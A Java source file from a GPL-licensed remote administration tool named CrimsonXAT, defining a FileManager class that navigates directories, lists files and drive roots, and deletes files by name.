/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.universal;



import java.io.File;
import java.util.Date;
import java.util.Random;

/**
 *
 * The FileManager can traverse the directory tree, list files, and delete them by using a
 * java reference File.
 *
 */

public class FileManager {

	public boolean atRootWin;
	public int id;
	// reference file
	private File t;
	private static String sep = Platform.fileSeparator;

	public FileManager() {
		// get current file
		t = new File(".");
		// go up one
		t = new File(t.getAbsolutePath().substring(0, t.getAbsolutePath().length() - 2));

		// random id
		id = new Random().nextInt();
	}

	public void close() {
		t = null;
		id = 0;
	}

	public void delete(String file) {
		Utilities.delete(new File(t.getAbsolutePath() + File.separator + file));
	}

	public void down(String file) {
		if (atRootWin) {
			t = new File(file);
			atRootWin = false;
			return;
		}
		File temp = new File(t.getAbsolutePath() + "/" + file);
		if (temp.isDirectory()) {
			t = new File(t.getAbsolutePath() + "/" + file);
		}
	}

	public FileListing[] list() {
		FileListing[] s = null;
		if (atRootWin) {
			// return root listing instead
			File[] f = File.listRoots();
			s = new FileListing[f.length];
			for (int i = 0; i < f.length; i++) {
				s[i] = new FileListing();

				// Logger.add("Setting Icon name to: " + f[i].getAbsolutePath());
				s[i].name = f[i].getAbsolutePath();
				// Logger.add("Settings path to: <empty>");
				s[i].path = "";
				// Logger.add("Setting dir to: " + f[i].isDirectory());
				s[i].dir = f[i].isDirectory();
			}

		} else {
			// Logger.add("[FILEMANAGER] listing files in: " + t.getAbsolutePath());
			File[] f = t.listFiles();
			if (f == null) {
				// could not list this dir
				f = new File[0];
			}
			s = new FileListing[f.length];
			for (int i = 0; i < f.length; i++) {
				// Logger.add("Getting info for file: " + f[i].getAbsolutePath());

				s[i] = new FileListing();

				// Logger.add("Setting Icon name to: " + f[i].getName());
				s[i].name = f[i].getName();
				// Logger.add("Setting path to: " + t.getAbsolutePath() +
				// Platform.fileSeparator);
				s[i].path = t.getAbsolutePath() + sep;
				// Logger.add("Setting dir to: " + f[i].isDirectory());
				s[i].dir = f[i].isDirectory();

				s[i].mTime = new Date(f[i].lastModified());
			}

		}

		return s;
	}

	public String pwd() {
		if (atRootWin) {
			return "";
		}
		return t.getAbsolutePath() + sep;
	}

	public void up() {
		if (atRootWin) {
			// wont go any farther
			return;
		}
		String path = t.getAbsolutePath();

		if (path.charAt(path.length() - 1) == File.separatorChar) {
			// last char is a separator; remove it
			path = path.substring(0, path.length() - 1);
		}
		if (path.indexOf(File.separator) == path.lastIndexOf(sep)) {

			// only one more dir to go up
			if (Platform.windows) {
				if (path.length() < 4) {
					atRootWin = true;
					t = null;
				} else {
					t = new File(t.getAbsolutePath().substring(0, 3));
				}

			} else {
				t = new File(t.getAbsolutePath().substring(0, 1));
			}

		} else {
			t = new File(t.getAbsolutePath().substring(0, t.getAbsolutePath().lastIndexOf(sep)));
		}

	}

}
